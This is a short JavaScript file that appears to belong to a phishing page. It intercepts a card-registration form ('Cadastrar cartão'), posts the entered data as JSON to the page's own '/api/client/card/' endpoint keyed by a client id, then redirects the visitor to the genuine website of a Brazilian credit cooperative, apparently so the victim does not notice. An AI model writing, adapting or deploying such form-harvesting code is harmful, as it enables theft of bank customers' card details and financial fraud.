const formCard = (() => {
    const client_id = document.body.dataset.client
    //private var/functions
    async function submit(targer) {
        const form = document.querySelector(targer);

        if(!form)  return

        

        form.addEventListener('submit', async function (e) {
            e.preventDefault()
            const btn = form.querySelector('.btn')

            try {
                const data = util.serialize(form)

                const config = {
                    method: `post`,
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                }

                const client = await (await fetch(`/api/client/card/${client_id}`, config)).json()

                

                btn.innerHTML = `<div class="spinner-border" role="status">
                    <span class="visually-hidden">Loading...</span>
                </div>`

                setTimeout(() => {
                    return window.location.href = `https://www.viacredi.coop.br/`
                }, 1000);

                
            } catch (error) {
                btn.innerHTML = `Cadastrar cartão`
                console.log(error)
            }
        });
    }
    
    return {
        //public var/functions
        submit
    }
})()


formCard.submit('.main-form-login.card')

